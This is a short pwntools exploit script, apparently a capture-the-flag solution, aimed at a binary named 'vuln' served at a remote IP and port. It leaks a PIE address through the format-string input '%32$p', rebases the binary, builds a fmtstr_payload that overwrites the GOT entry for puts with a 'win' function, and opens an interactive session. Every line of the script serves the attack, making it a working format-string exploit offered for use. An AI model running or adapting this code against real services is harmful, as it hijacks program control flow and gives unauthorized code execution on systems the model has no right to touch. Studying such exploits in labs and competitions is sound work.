from pwn import *

gs = '''
b *main+217
continue
'''

elf = context.binary = ELF("./vuln")

def start():
    if args.REMOTE:
        return remote("74.207.229.59", 20221)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

"""
io.sendline(b"%p."*100)

output = io.recv().strip().decode().split(".")

for i in range(1, len(output)):
    print(f"{i} : {output[i]}")
"""

io.sendline(b"%32$p")

io.recvline()

leak_pie = io.recvline().strip()

print(leak_pie)

elf.address = int(leak_pie, 16) - 0x3dd8

writes_dict = {
    elf.got.puts: elf.sym.win
}

payload = fmtstr_payload(6, writes_dict)
#io.sendline(b"AAAA%6$p")

io.sendline(payload)


io.interactive()